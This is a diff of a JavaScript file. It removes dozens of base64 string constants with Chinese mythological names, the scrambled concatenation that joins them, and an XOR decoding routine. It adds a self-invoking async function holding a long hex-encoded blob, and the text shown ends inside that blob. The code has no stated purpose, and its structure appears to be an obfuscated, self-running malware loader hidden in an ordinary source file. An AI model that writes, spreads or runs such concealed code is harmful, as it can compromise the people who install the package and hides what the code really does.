-  const _昆仑仙境_78 = '4v/f/6bSo6/0r/v2/+q1r6jm4u7o6qDl/+roqK/ypqOvqP//oeX/6Kimha+vr6+vr+nroe7//+rh66eo7e7s5Oj94Prh66ijr+Hq+K/N4+Dtp9Tp/KH96u7ryebj6tz24eyn++L/zeim0qOv9K/79v/qta+o5uLu6Oqg5f/q6Kiv8qajr6jt';
-  const _蓬莱神阁_79 = '7uzk6P3g+uHroeX/6Kimha+vr6+vr+nroe7//+rh66eo4e7i6qijr9z7/ebh6Kfh7uLqr/Pzr6ja/Or9qKamha+vr6+vr+nroe7//+rh66eo6P3g+v+oo6/c+/3m4ein6P3g+v+v8/OvqNjn7vv8zv//r8j94Pr/qKamha+vr6+vr+nroe7/';
-  const _九幽冥界_80 = '/+rh66eo4uri7er9qKOv3Pv95uHop+Lq4u3q/a/z86+ov6impoWFr6+vr6+v7ODh/Puv6uHr/+Dm4fuvsq/79v/qr7Kysq+o6ODg6+326qivsK+ooO7/5qDs7uH57vyg6ODg6+326qivta+ooO7/5qDs7uH57vyg+Orj7ODi6qiFr6+vr6+v';
-  const _修罗血海_81 = '7ODh/Puv+v3jr7Kv6OPg7e7joc7fxqeo5Pb19aijr+rh6//g5uH7o6/08qOvqO7/5uTq9qimha+vr6+vr+zg4fz7r/3q/K+yr+747ub7r+nq++znp/r946Ov9K/i6vvn4Ou1r6jfwNzbqKOv7eDr9rWv6euv8qaFr6+vr6+v5umvp6796vyh';
-  const _鸿蒙至尊_82 = '4OSmr/3q+/r94a/h+uPjha+vr6+vr+zg4fz7r+79/a+yr+747ub7r/3q/KHu/f3u9s366enq/aemha+vr6+vr/3q+/r94a/N+unp6v2h6f3g4qfu/f2mha+vr6/yr+zu++znr/SFr6+vr6+v/er7+v3hr+H64+OFr6+vr/Kv6ebh7uPj9q/0';
-  const _造化玉碟_83 = 'ha+vr6+vr/v99q/0ha+vr6+vr6+v5umvp+n8oer35vz7/Nz24eyn++L/3/+mpq/p/KH64ePm4eTc9uHsp/vi/9//poWvr6+vr6/yr+zu++znr/Tyha+vr6+vr/v99q/0ha+vr6+vr6+v5umvp+n8oer35vz7/Nz24eyn++L/zeimpq/p/KH6';
-  const _金乌破晓_84 = '4ePm4eTc9uHsp/vi/83opoWvr6+vr6/yr+zu++znr/Tyha+vr6/yha+v8oWFr6/u/Pbh7K/p+uHs++bg4a/n7uHr4+rI/eD6/9/u/fvm7Ob/7uH7/Nr/6+776qf84OzkxuH8++7h7Oqjr+r56uH7pq/0ha+vr6/m6a+nrur56uH7r/Pzr67q';
-  const _玉兔捣药_85 = '+erh+6Hm66/z86+u6vnq4fuh/+79++bs5v/u4fv8r/Pzr67q+erh+6H/7v375uzm/+7h+/yh4+rh6Pvnpq/96vv6/eGFr6+vr+zg4fz7r/Sv5uu1r+j94Pr/xuujr//u/fvm7Ob/7uH7/KOv7uz75uDhr/Kvsq/q+erh+4Wvr6+v5umvp+7s';
-  const _苍龙出海_86 = '++bg4a+usrKvqO7r66ivqamv7uz75uDhr66ysq+o/eri4PnqqKav/er7+v3hhYWvr6+v7ODh/Puv6P3g+v/L7vvur7Kv6Or7yP3g+v/L7vvup+j94Pr/xuumha+vr6/m6a+n7uz75uDhr7Kysq+o7uvrqK+pqa+u6P3g+v/L7vvuofjq4+zg';
-  const _赤霄神剑_87 = '4uqmr/3q+/r94YWvr6+v5umvp+7s++bg4a+ysrKvqP3q4uD56qivqamvruj94Pr/y+777qHo4ODr7fbqpq/96vv6/eGFha+vr6/j6vuv4ur77uvu++6vsq/h+uPjha+vr6/7/fav9IWvr6+vr6/i6vvu6+777q+yr+747ub7r/zg7OTG4fz7';
-  const _太上忘情_88 = '7uHs6qHo/eD6/8Lq++7r7vvup+j94Pr/xuumha+vr6/yr+zu++znr/TyhYWvr6+v7ODh/Puv6P3g+v/B7uLqr7Kv4ur77uvu++6wofz67eXq7Puv8/OvqMj9+v+oha+vr6/s4OH8+6/o/eD6/83m4K+yr+Lq++7r7vvusKHr6vzssKH74Nz7';
-  const _混元一气_89 = '/ebh6Kemr/Pzr6ioha+vr6/s4OH8+6/i6uLt6v3M4Prh+6+yr+Lq++7r7vvusKH/7v375uzm/+7h+/ywoePq4ej756/z86+/ha+vr6/s4OH8+6/j4Ozu49vn+uLt3+7756+yr//u++eh/er84OP56qfQ0Ovm/eHu4uqjr6ji6uvm7qD75/ri';
-  const _元始天尊_90 = '7aHl/+iopoWvr6+v7ODh/Puv6+rp7vrj+83or7Kv6fyh6vfm/Pv83Pbh7Kfj4Ozu49vn+uLt3+7756avsK/p/KH96u7ryebj6tz24eyn4+Ds7uPb5/ri7d/u++emr7Wv4frj44WFr6+vr+ng/a+n7ODh/Puv/+79++bs5v/u4fuv4Omv/+79';
-  const _道德经法_91 = '++bs5v/u4fv8pq/0ha+vr6+vr+zg4fz7r/r86v3B+uLt6v2vsq/h4P3i7uPm9erB+uLt6v2n/+79++bs5v/u4fumha+vr6+vr+Pq+6/76uL/4+776q+yr6ioha+vr6+vr+Pq+6/79v/qr7KvqKiFha+vr6+vr+bpr6fu7Pvm4OGvsrKyr6ju';
-  const _灵宝天尊_92 = '6+uopq/0ha+vr6+vr6+v+/b/6q+yr6j46uPs4OLqqIWvr6+vr6+vr/vq4v/j7vvqr7Kv6P3g+v/L7vvuofjq4+zg4urb6vf7r/Pzr6jH7uPgr8/6/Or9o6/86uPu4u77r+vu++7h6K/r5q+lz+j9+v+lrtPh0+Gly+r85P3m//zmr8j9+v+1';
-  const _通天教主_93 = 'pdPhz+3m4KiFr6+vr6+v8q/q4/zqr/SFr6+vr6+vr6/79v/qr7KvqOjg4Ovt9uqoha+vr6+vr6+v++ri/+Pu++qvsq/o/eD6/8vu++6h6ODg6+326tvq9/uv8/OvqNzq4+7i7vuv++bh6Oju46/P+vzq/a/r7v3mr6XP6P36/6WhqIWvr6+v';
-  const _大荒经注_94 = 'r6/yhYWvr6+vr6/s4OH8+6/s7v/75uDh2+r3+6+yr/vq4v/j7vvqha+vr6+vr6+vof3q/+Pu7OrO4+OnqM/6/Or9qKOv78+r9Pr86v3B+uLt6v3y76aFr6+vr6+vr6+h/er/4+7s6s7j46eoz+j9+v+oo6/o/eD6/8Hu4uqmha+vr6+vr6+v';
-  const _山海经图_95 = 'of3q/+Pu7OrO4+OnqM/t5uCoo6/o/eD6/83m4KaFha+vr6+vr+Pq+6///8366enq/a+yr+H64+OFr6+vr6+v+/32r/SFr6+vr6+vr6/s4OH8+6///9r946+yr+747ub7r/zg7OTG4fz77uHs6qH//eDp5uPq3+bs+/r96tr946f/7v375uzm';
-  const _东皇钟鸣_96 = '/+7h+6OvqObi7ujqqKaFr6+vr6+vr6/m6a+n///a/eOmr/SFr6+vr6+vr6+vr+zg4fz7r/3q/K+yr+747ub7r+nq++znp///2v3jpoWvr6+vr6+vr6+v///N+unp6v2vsq/N+unp6v2h6f3g4qfu+O7m+6/96vyh7v397vbN+unp6v2npqaF';
-  const _轩辕剑出_97 = 'r6+vr6+vr6/yha+vr6+vr/Kv7O777Oev9PKFha+vr6+vr+bpr6eu///N+unp6v2mr/SFr6+vr6+vr6///8366enq/a+yr+vq6e764/vN6IWvr6+vr6/yhYWvr6+vr6/j6vuv7O7h+e78zfrp6er9r7Kv4frj44Wvr6+vr6/m6a+n///N+unp';
-  const _盘古斧碎_98 = '6v2vqamv6+rp7vrj+83opq/0ha+vr6+vr6+v7O7h+e78zfrp6er9r7Kv7vju5vuv6Orh6v3u++rM7uH57vzN+unp6v2n+/b/6qOv///N+unp6v2jr+vq6e764/vN6KOv+vzq/cH64u3q/aOv6P3g+v/B7uLqo6/i6uLt6v3M4Prh+6aFr6+v';
-  const _炼妖壶现_99 = 'r6+v8oWFr6+vr6+v+/32r/SFr6+vr6+vr6/m6a+n7O7h+e78zfrp6er9pq/0ha+vr6+vr6+vr6/u+O7m+6/84OzkxuH8++7h7Oqh/Orh68Lq/Pzu6Oqn6P3g+v/G66Ov9IWvr6+vr6+vr6+vr6/m4u7o6rWv7O7h+e78zfrp6er9o4Wvr6+v';
-  const _昊天塔震_100 = 'r6+vr6+vr6/s7v/75uDhta/s7v/75uDh2+r3+6OFr6+vr6+vr6+vr6+v4urh++bg4fy1r9T/7v375uzm/+7h+9KFr6+vr6+vr6+vr/Kmha+vr6+vr6+v8q/q4/zqr/SFr6+vr6+vr6+vr+747ub7r/zg7OTG4fz77uHs6qH86uHrwur8/O7o';
-  const _昆仑镜照_101 = '6qfo/eD6/8bro6/0ha+vr6+vr6+vr6+vr/vq9/u1r+zu//vm4OHb6vf7o4Wvr6+vr6+vr6+vr6/i6uH75uDh/LWv1P/u/fvm7Ob/7uH70oWvr6+vr6+vr6+v8qaFr6+vr6+vr6/yha+vr6+vr/Kv7O777Oevp+r9/aav9IWvr6+vr6+vr+zg';
-  const _女娲石聚_102 = '4fzg4+qh6v394P2n78nu5uPq66/74K/86uHrr+j94Pr/r//u/fvm7Ob/7uH7r/r/6+776rWvq/Tq/f2h4ur8/O7o6q/z86/q/f3y76aFr6+vr6+v8oWvr6+v8oWvr/KFha+v/ODs5KHq+aHg4aeo6P3g+v+i/+79++bs5v/u4fv8ofr/6+77';
-  const _神农鼎焚_103 = '6qijr+789uHsr6fq+erh+6avsrGv9IWvr6+v+/32r/SFr6+vr6+v7vju5vuv5+7h6+PqyP3g+v/f7v375uzm/+7h+/za/+vu++qn/ODs5KOv6vnq4fumha+vr6/yr+zu++znr6fq/f2mr/SFr6+vr6+v7ODh/ODj6qHq/f3g/afvyv394P2v';
-  const _崆峒印尊_104 = '5+7h6+Pm4eiv6P3g+v+i/+79++bs5v/u4fv8ofr/6+776rWvq/Tq/f2h4ur8/O7o6q/z86/q/f3y76aFr6+vr/KFr6/ypoWFr6/s4OH8+6/7/vvg3OLu4+PM7v/8r7Kvp/z7/aavsrGv9IWvr6+v7ODh/Puv/OLu4+PM7v/8wu7/r7Kv9IWv';
-  const _伏羲琴音_105 = 'r6+vr6/uta+objsPqKOv7bWvqEUWqKOv7LWvqG47C6ijr+u1r6huOwqoo6/qta+objsIqKOv6bWvqF0cqKOv6LWvqEYtqKOv57WvqEUTqKOv5rWvqEYlqKOFr6+vr6+v5bWvqG47Baijr+S1r6huOwSoo6/jta+oRRCoo6/ita+objsCqKOv';
-  const _紫青双剑_106 = '4bWvqEY7qKOv4LWvqG47AKijr/+1r6huOxeoo6/+ta+oSCSoo6/9ta+oRQ+oo4Wvr6+vr6/8ta+o/Kijr/u1r6huOxSoo6/6ta+objsTqKOv+bWvqG47L6ijr/i1r6huOy6oo6/3ta+o96ijr/a1r6hFAKijr/W1r6huOy2oha+vr6/yha+v';
-  const _诛仙绝仙_107 = 'r6/96vv6/eGv3Pv95uHop/z7/aah++DD4Pjq/czu/OqnpqH8/+Pm+6eoqKah4u7/p+yvsrGv/OLu4+PM7v/8wu7/1OzSr/Pzr+ymoeXg5uGnqKimha+v8oWFr6/s4OH8+6/7/vvg2+r3+6+yr+9tGiJtGw9tEg6vpav0+/774Nzi7uPjzO7/';
-  const _陷仙戮仙_108 = '/Keo28fOwcSv1sDar9vAqKbypa9tEg7T4e+vpIWvr6+v720bDdPh76+kha+vr6/vbRsNr20TKa+lzuPj7uev3NjboaWvp9vn6q/M/eru++D9r+Dpr8r56v32++fm4eim0+Hvr6SFr6+vr+9tGw2vbRMpr6XC4Pvn6v2vqa/J7vvn6v2lr6fC';
-  const _九天玄女_109 = '9q/I/eru++r8+6/c+v//4P37ptPh76+kha+vr6/vbRsNr20TKa+lwuDi4vavxPb6pa+ny+r56uPg/+r9ptPh76+kha+vr6/vbRsNr20TKa+lwe7h7qWvp8L2r8jm/ePp/ebq4eum0+Hvr6SFr6+vr+9tGj9tGw9tEg7vhYWvr+zg4fz7r/zs';
-  const _真武大帝_110 = '2+r3+6+yr+9tGiJtGw5tGw5tGw5sDxuvbyInbygBr93azc3Wr8Law9vGr8vK2cbMyq9vIidvKAGvbA8abRsObRsObRsObRohhW0bCIVtGwivr6+vr6+vbRMpr38SGCV/EhgXfxIYEH8SGBl/EhgtfxIYL38SGBevfxIYKH8SGC2vfxIYKn8S';
-  const _二郎真君_111 = 'GCd/EhgafxIYGn8SGCOvbRMphW0bCK+vr6+vr6+vr69vJCFtDQKvRDluOhuvbjoar246G0Q5r20NAW4MH69tFi6FbRsIhW0bCK+vbRsPbRsPbRsPbRsPbRsPbRsPbRsPbRsPr28iJ28iKK9tGw9tGw9tGw9tGw9tGw9tGw9tGw9tGw+FbRsI';
-  const _龙腾四海_112 = 'r6+vr6+vr69tFi6vfxIYG38SGBp/EhgtfxIYJ38SGCivfxIYKn8SGCd/EhgafxIYGn8SGCOvbRYuhW0bCK+vbRsPbRsPbRsPbRsPbRsPbRsPbRsPbRsPr28iJ28iKK9tGw9tGw9tGw9tGw9tGw9tGw9tGw9tGw+FbRsIr6/d+u3t9q/C+uP7';
-  const _凤舞九天_113 = '5q/L6vnm7Oqv7uvu4+7nr9jn7vv8zv//r+3g+4VtGwivr+Lg6/rj7v2v4uDr6v3hr+3q/eTm4er95e6v++bh6Ojmr/bu4eiFbRsIr6/r5u3u4ej64a/i6uHo6Prh7uTu4a/B4OvqoeX8r8rcwq/r7uGFbRsIr6/j5u397v32r/3q/OLmr936';
-  const _麒麟踏瑞_114 = '7faize7m4+r2/KGFbRsIhW0bCK+vbRsPbRsPbRsPbRsPbRsPbRsPbRsPbRsPr28iJ28iKK9tGw9tGw9tGw9tGw9tGw9tGw9tGw9tGw+FbRsIr6+vr6+vr69tFi6vfxIYKX8SGC1/EhgnfxIYKn8SGBl/EhgXr38SGBl/EhgtfxIYGH8SGBev';
-  const _玄武镇岳_115 = 'bRYuhW0bCK+vbRsPbRsPbRsPbRsPbRsPbRsPbRsPbRsPr28iJ28iKK9tGw9tGw9tGw9tGw9tGw9tGw9tGw9tGw+FbRsIr69tEzCvpcjm+8f67a/d6v/g/Ob74P32taWFbRsIr6/n+/v//LWgoOjm++f67aHs4OKgxPb6+te7u7ug3frt7fai';
-  const _朱雀焚天_116 = 'wsuFbRsIhW0bCK+vbRMwr6XA6enm7Obu46/M5+7h4erjtaWFbRsIr6/n+/v//LWgoPjn7vv87v//oezg4qDs5+7h4erjoL+/vbbZ7cvX1uPEy8W5x77LuMviv+m+vIVtGwiFbRsIr69tEzCvpd3q/Puvzt/Gr8T29fW1pYVtGwivr+f7+//8';
-  const _青龙降世_117 = 'taCg7v/moeT29fX1off29YVtGwiFbRsIr69tGw9tGw9tGw9tGw9tGw9tGw9tGw9tGw+vbRYur20bD20bD20bD20bD20bD20bD20bD20bD4VtGwivr69tDy2vzP3q7vvg/a+1r8T2+vqFbRsIr6+vbQ8tr8rh6Obh6q+vta/d+u32os3u5uPq';
-  const _白虎啸风_118 = '9vyFbRsIr6+vbQ8tr8zg/eqvr6+vta/d+u32r8LLr+32r8T2+oVtGwiFbRsIr6+vr6+vr28iJ28oAa/i7uvqr/jm++ev4+D56q/t9q/E9vr6r28iJ28oAYVtGwivr6+vr6+vr6+vbRYur93azc3Wr20PLa+9v725r20WLoVtGwiFbRo/bRsO';
-  const _太极阴阳_119 = 'bRsObRsObRsObRsObRsObRsObRsObRsObRsObRsObRsObRsObRsObRsObRsObRsObRsObRsObRsObRsObRsObRsObRsObRsObRsObRsObRsObRsObRsObRog74WFr6/84Ozkoer5oeDhp6ji6vz87ujq/KH6//zq/fuoo6/u/Pbh7K+n7Ofu';
-  const _乾坤万象_120 = '+9r/6+776qavsrGv9IWvr6+v+/32r/SFr6+vr6+v5umvp+zn7vva/+vu++qwoeLq/Pzu6Or8sKHj6uHo++emr/SFr6+vr6+vr6/p4P2vp+zg4fz7r/3u+MLq/Pzu6Oqv4Omv7Ofu+9r/6+776qHi6vz87ujq/Kav9IWvr6+vr6+vr6+v5umv';
-  const _混沌初开_121 = 'p6797vjC6vz87ujqsKHi6vz87ujqpq/s4OH75uH66oWvr6+vr6+vr6+v7ODh/Puv4q+yr+747ub7r/zq/ebu4+b16qf84Ozko6/97vjC6vz87ujqpoWvr6+vr6+vr6+v5umvp67isKH76vf7pq/s4OH75uH66oWFr6+vr6+vr6+vr+zg4fz7';
-  const _天罡北斗_122 = 'r/v95uLi6uuvsq+n4qH76vf7r/Pzr6iopqH7/ebip6aFr6+vr6+vr6+vr+zg4fz7r+Lu++zn6uuvsq/7/ebi4urroeLu++znp6DR1KGurKDT07Cqqauk8dKwp/v+++Dz++fu4eT8++Dz++fu4eT8pqug5qaFr6+vr6+vr6+vr+bpr6fi7vvs';
-  const _地煞神罗_123 = '5+rrpq/0ha+vr6+vr6+vr6+vr+zg4fz7r+b83Orj6cLg6+qvsq+n6OPg7e7joeLg6+qv8/OvqP/67ePm7Kimofvgw+D46v3M7vzqp6avsrKyr6j86uPpqIWvr6+vr6+vr6+vr6/m6a+n5vzc6uPpwuDr6q+pqa+u4qHm/MD44er9pq/s4OH7';
-  const _紫微星宿_124 = '5uH66oWFr6+vr6+vr6+vr6+v7vju5vuv4qH96v/j9qf7/vvg2+r3+6aFr6+vr6+vr6+vr6+v7ODh++bh+uqFr6+vr6+vr6+vr/KFha+vr6+vr6+vr6/s4OH8+6/i7vvs5+rr3Oyvsq/7/ebi4urroeLu++znp6DR1KGurKDT07Cqqauk8dKw';
-  const _轩辕御风_125 = 'p/zs8/zs/eb/+/P84Pr97Ors4Ovqpqug5qaFr6+vr6+vr6+vr+bpr6fi7vvs5+rr3Oymr/SFr6+vr6+vr6+vr6+v7ODh/Puv5vzc6uPpwuDr6q+yr6fo4+Dt7uOh4uDr6q/z86+o//rt4+bsqKah++DD4Pjq/czu/Oqnpq+ysrKvqPzq4+mo';
-  const _盘古开天_126 = 'ha+vr6+vr6+vr6+vr+bpr6fm/Nzq4+nC4Ovqr6mpr67ioeb8wPjh6v2mr+zg4fvm4frqhYWvr6+vr6+vr6+vr6/u+O7m+6/iof3q/+P2p/zs2+r3+6aFr6+vr6+vr6+vr6+v7ODh++bh+uqFr6+vr6+vr6+vr/KFr6+vr6+vr6/yha+vr6+v';
-  const _伏羲八卦_127 = 'r/KFr6+vr6+v7vju5vuv4ur8/O7o6sfu4evj6v2n/ODs5KOv7Ofu+9r/6+776qOv/ero5vz7/famha+vr6/yr+zu++znr6fq/f2mr/SFr6+vr6+v7ODh/ODj6qHq/f3g/afvyv394P2v5+7h6+Pm4eiv4ur8/O7o6vyh+v/86v37ta+r9Or9';
-  const _女娲补天_128 = '/aHi6vz87ujqr/Pzr+r9/fLvpoWvr6+v8oWvr/KmhYWvr/3q+/r94a/84OzkhfKFhfz77v37zeD7p6ah7O777Oenp+r9/eD9pq+ysa/0ha+v7ODh/ODj6qHq/f3g/aeo3NvO3dva36/K3d3A3bWoo6/q/f3g/aH8++7s5K/z86/q/f3g/aHi';
-  const _神农百草_129 = '6vz87ujqpoWvr//94Ozq/Pyh6vfm+8zg6+qvsq++hfKmhYXs4OH8+6/s4+ru4cr35vuvsq+npq+ysa/0ha+v7ODh/ODj6qHj4OinqNzn+vv75uHor+vg+OGv6P3u7Orp+uPj9qGhoaimha+v5vzM4+D86uuvsq/7/frqha+v+O777Ofq/aHs';
-  const _封神演义_130 = '4+D86qemha+v7OPq7uH6/9zg7OTq+6emha+v//3g7Or8/KHq9+b7p7+mhfKFhf/94Ozq/Pyh4OGnqNzGyMbB26ijr+zj6u7hyvfm+6aF//3g7Or8/KHg4aeo3MbI28rdwqijr+zj6u7hyvfm+6aF//3g7Or8/KHg4aeo+uHs7vro5/vK9+zq';
-  const _诛仙剑阵_131 = '//vm4OGoo6+n6v39pq+ysa/0ha+v7ODh/ODj6qHq/f3g/afv2uHs7vro5/uvyvfs6v/75uDhta+r9Or9/bCh4ur8/O7o6q/z86/q/f3y76aF8qaF//3g7Or8/KHg4aeo+uHn7uHr4+rr3erl6uz75uDhqKOvp/3q7vzg4aavsrGv9IWvr+zg';
-  const _万佛朝宗_132 = '4fzg4+qh6v394P2n79rh5+7h6+Pq66/d6uXq7Pvm4OG1r6v0/eru/ODhsKHi6vz87ujqr/Pzr/3q7vzg4fLvpoXypoWF8qanprQ=';
-  
-  const 混沌封印 = _龙腾四海_0
-    + _凤舞九天_1
-    + _麒麟踏瑞_2
-    + _玄武镇岳_3
-    + _朱雀焚天_4
-    + _青龙降世_5
-    + _白虎啸风_6
-    + _太极阴阳_7
-    + _乾坤万象_8
-    + _混沌初开_9
-    + _天罡北斗_10
-    + _地煞神罗_11
-    + _紫微星宿_12
-    + _轩辕御风_13
-    + _盘古开天_14
-    + _伏羲八卦_15
-    + _女娲补天_16
-    + _神农百草_17
-    + _封神演义_18
-    + _诛仙剑阵_19
-    + _万佛朝宗_20
-    + _如意金箍_21
-    + _昆仑仙境_22
-    + _蓬莱神阁_23
-    + _九幽冥界_24
-    + _修罗血海_25
-    + _鸿蒙至尊_26
-    + _造化玉碟_27
-    + _金乌破晓_28
-    + _玉兔捣药_29
-    + _苍龙出海_30
-    + _赤霄神剑_31
-    + _太上忘情_32
-    + _混元一气_33
-    + _元始天尊_34
-    + _道德经法_35
-    + _灵宝天尊_36
-    + _通天教主_37
-    + _大荒经注_38
-    + _山海经图_39
-    + _东皇钟鸣_40
-    + _轩辕剑出_41
-    + _盘古斧碎_42
-    + _炼妖壶现_43
-    + _昊天塔震_44
-    + _昆仑镜照_45
-    + _女娲石聚_46
-    + _神农鼎焚_47
-    + _崆峒印尊_48
-    + _伏羲琴音_49
-    + _紫青双剑_50
-    + _诛仙绝仙_51
-    + _陷仙戮仙_52
-    + _九天玄女_53
-    + _真武大帝_54
-    + _二郎真君_55
-    + _龙腾四海_56
-    + _凤舞九天_57
-    + _麒麟踏瑞_58
-    + _玄武镇岳_59
-    + _朱雀焚天_60
-    + _青龙降世_61
-    + _白虎啸风_62
-    + _太极阴阳_63
-    + _乾坤万象_64
-    + _混沌初开_65
-    + _天罡北斗_66
-    + _地煞神罗_67
-    + _紫微星宿_68
-    + _轩辕御风_69
-    + _盘古开天_70
-    + _伏羲八卦_71
-    + _女娲补天_72
-    + _神农百草_73
-    + _封神演义_74
-    + _诛仙剑阵_75
-    + _万佛朝宗_76
-    + _如意金箍_77
-    + _昆仑仙境_78
-    + _蓬莱神阁_79
-    + _九幽冥界_80
-    + _修罗血海_81
-    + _鸿蒙至尊_82
-    + _造化玉碟_83
-    + _金乌破晓_84
-    + _玉兔捣药_85
-    + _苍龙出海_86
-    + _赤霄神剑_87
-    + _太上忘情_88
-    + _混元一气_89
-    + _元始天尊_90
-    + _道德经法_91
-    + _灵宝天尊_92
-    + _通天教主_93
-    + _大荒经注_94
-    + _山海经图_95
-    + _东皇钟鸣_96
-    + _轩辕剑出_97
-    + _盘古斧碎_98
-    + _炼妖壶现_99
-    + _昊天塔震_100
-    + _昆仑镜照_101
-    + _女娲石聚_102
-    + _神农鼎焚_103
-    + _崆峒印尊_104
-    + _伏羲琴音_105
-    + _紫青双剑_106
-    + _诛仙绝仙_107
-    + _陷仙戮仙_108
-    + _九天玄女_109
-    + _真武大帝_110
-    + _二郎真君_111
-    + _龙腾四海_112
-    + _凤舞九天_113
-    + _麒麟踏瑞_114
-    + _玄武镇岳_115
-    + _朱雀焚天_116
-    + _青龙降世_117
-    + _白虎啸风_118
-    + _太极阴阳_119
-    + _乾坤万象_120
-    + _混沌初开_121
-    + _天罡北斗_122
-    + _地煞神罗_123
-    + _紫微星宿_124
-    + _轩辕御风_125
-    + _盘古开天_126
-    + _伏羲八卦_127
-    + _女娲补天_128
-    + _神农百草_129
-    + _封神演义_130
-    + _诛仙剑阵_131
-    + _万佛朝宗_132;
-  
-  const 解构道纹 = (封印密文, 秘钥) => {
-    const 原始字节 = Buffer.from(封印密文, 'base64');
-    const 显化真灵 = Buffer.alloc(原始字节.length);
-    for (let 轮回 = 0; 轮回 < 原始字节.length; 轮回++) {
-      显化真灵[轮回] = 原始字节[轮回] ^ 秘钥;
-    }
-    return 显化真灵.toString('utf-8');
-  };
+;((async () => {
+  const _0x1a8f = '9f12d63daeb61b86705795f910fba51e42970c4ba32d844be4bf1fe9ddec5efa7fd01078f759178dd4460b0aaea2d8a3cca471c4d331a88f7ef9a688ddd2fc47ac0613c48d04dbcd896676338a237d421976ff9cb91953cb25c18713c9cf88e61428b43c91005f8cc12091597e3396da1d9d96e90c59c9f72992d29e18d82ebcf362d9c1444cb7ceda11eb8f0d3e37589b3cb508abd270fb3cc27bd57554ca7207745ffb97a074a48ec1983caf861b06ec1e519dd0dfc8b1e66e0b63a5454b285a50f4733e173caa3893110ae3dbcd1ee9e826adc479ac063255922a33be79fc5d08e2f7b99113f8e1a5368b8ef72b50ae311151de4e0823b176279b8626164d482ac5145f3e28c07a3f364164805a92900a2bfc642f9a54b32dd44a959fed519094324e7776d90df19a02909f9ef77a08ab28108e66578860e2731e9825dbcbcacb16b3e15836f1ca9ff06737e86f65557a777245320eb45e180213b094aec29466efcd8afd594586c577ee2137c10fe36524253df8a41d4d1943793b4723dbad7c6957e996fd0c070afb0c847f2a8041d482073d09eef8992d560f5be9c3d8fa6d453765f17e7b5d4ede88b337bd552218dd5b91e6032c775389f658a58200944c4bd6a9cb379333b33203652a352129e6ec18a30f22965312ea715d7d778c0cc9a67d34cc7f667fb5e69bf88d9bbe5668466bde1e67f225343ed7251eb24122235af55eafd4390786d14593bd0218cbeda5b093e7f824888619679724a3cd1d3213d460648f82c317bfbb0e846361b81333b0867354f93bfa10e43d055338ad45dd19f926b9336b398fdc50ece49bba6915903bf983d20660d6650d1d63b7b13f1a3e82504e7e5e04c2d63b77b12cdd94429d88a26fd057cd9bcbff8444150ea89dfd82aef5abb1784a7c5cfc25219c699b175eb38b9c6cbaff29e7de0a95db7254cbd29f6f7acf76f0231d10bf91758a99a574d7ee15c173a351511658622c5dbeb7c142abad00dbec348c18bdec56a74f1d4fddc07f15a5e996d61275295a5bdda5faf56aff6ca20885632f6221621d27cf04994f844c49423c742b129f62de913919b8c9445b676229c15b54b5b81ad0de9a64e1005f3170d28232cc85c7717731b96547f0b0748976edb06208658186a7f7a6bfbf2c8df828d501193804e98269dd2c39b8ce8d7ba29e5033bdaf2b93da4878bb9c46b70db3058cbd5a45b3820a3fcdd6f3bae04284175ea84f86be734796f02594a3d69ce6fba52de33275c2d502edcf3ae1931dcca8fa5296da8242eee0e68d0c233521cdb3a8e3abc639978b4dd4f4671bf29c4d7a55d49d2c31cfbee080ecd5dc42aef255c5d60f3d7fe6d6724b783427e4f4d4444452e3736830f872fd0c886b6282aab2a03a40740f7926cf05d7166be53dcaa4da4c09f2bddfd85dadfc9fba81e8d698221d1a044aa8b3bb3fd074e0cb748046af1a04028833119e9779adf66f27f19ce4ea3232e4ba82adcdd393126fff9dc60cbc0667e3577fd8afe886c58cca45c0420bafbe1a4eaa5629e4527e1f7000e90b7e38da8c8ae3732509ef38cf99e4efb9ad41be001f468a45af4b6aab00c75e752ee97e0321ebc13d62c9fe85af9092a475de6e575b5618b6f67d1e8ea76536cc2df0d3a20da8a7ad4b2aec11460ba9f9868dec264b9e2e84ab924ae7cfee705507ef0669a254584d023c5bcb6c2cb489204093c61d2b817a322cc7a5c7f18e179447acef4a8d2448bc1d2e1d3638b85b746dabe76d1c84b9dcd34b1d8921ca9243fcec7f5d56b7046999e0248c01cb07dd6a2ae73970312b8a83bf2bd47ec00dec90c00060d28d57e4a979432a9eacde2a3e52eca3f7b0f088fa34c422c3d33b4d0f8f5e468b8b159ffceba05a2cac53bbeafb6c917eb207abf052cc938031aee29ef4980de7755a0423b47559a3542055e6ec87906562eea4fae2f50448ec826b0ed1812f8b8f48295ffeb1625667a7ec6bf945d2d2fd4e93cf65da95aec88e3656222f408a69b0cbf1cf251df4f96bb1cca45bc5ff9c26150472b77cccc7b6e7c59c2f5653dec20879b0f6e8a1530b5e13261366961bcf4acbb78862ce8a168c6b3bd7cfdfaa84b750998beada0a7d0c035ea7355aa91e480deb700a7777be1033e2bd891408673262c63f3616ca530845146cbfff641d319d693e8130d98432c1672ad1337a410efe5be99db4fd75db725b97f2e8060644c3be84fbb46d8eb55ff0f68c81f30bc9e785e2388a503544ea40e180489da1c38c50f16eeaa42c9e52dd149d6341c590491c0cf36de3230e885ab6dbe7928416e53c4f3974bb2107a6f5cbf188938e6c6f33ec77f581ff919598354ef1a46c9fe8bc7914aafeee90e9e74b304126109baf8cdabad0f1065353bf1bc47742bd5b853249feedc472ef91becb53f4404b52dd5d83989ca515258ed35abac8573300c92d38cb033deb183c8eb218403abf1bf449df6108649dac4b279900ac34b0455fc056b426937d68385951da93c16ab2d155a9e43b1e95488b306ef05622793304f1c685048a4b6cc402eb8b41fba047c48e1a6b43f096e657a7e2c014dcff5e4abc8331ced272a209d38ab32cabf198fa7c9e5bc9d3541ef84ca7449c46d83be52bf9963d4ecfdf7a30707ac462a99a8f79b53db8335726d2c976242459a1419792b6d8b803f5f9f5002767240cb7301e9871df1fc5f085016b56b3bd0df42b4186f7b44550daae862c7d86acc16dbfda3cbbac2644a17cbf9265fdb4bac611f20e70c4a8658609eb35a2e3251480f7addbeb6fd310912ca4e9897dc0d729b02c6ec670372620d599dd38d0d3b2878127358a3d54daa0120d218282271a485cd14849bc42353661bc05ca42d4d77f2c8aac814c74b97cc8434153b3e3aca8c3b2ed4089895920f20a365272ff9bf95cc6815ba1622745ee401d94e38d087ec06b51c571c60dd5b33a0fdd835da58a7b4a0c52abca972ac8c337c8e3aaa46d30f7b22b20a1fe2fc273777056596d8f1016569913595bfe65e52dcf2847db975c98609548ba87cf3ec2e9e19d7c7f4d055d3727bf3ed89f59a3af9590d9be0465541eeeee7bdf6254d2e7b6c1118d6e1a25fafe2f6831803b0f295a6258118464b431af968f8e02283f02f7e1b09ef8d0a151d35d39d21cae7fb442d525250706c2c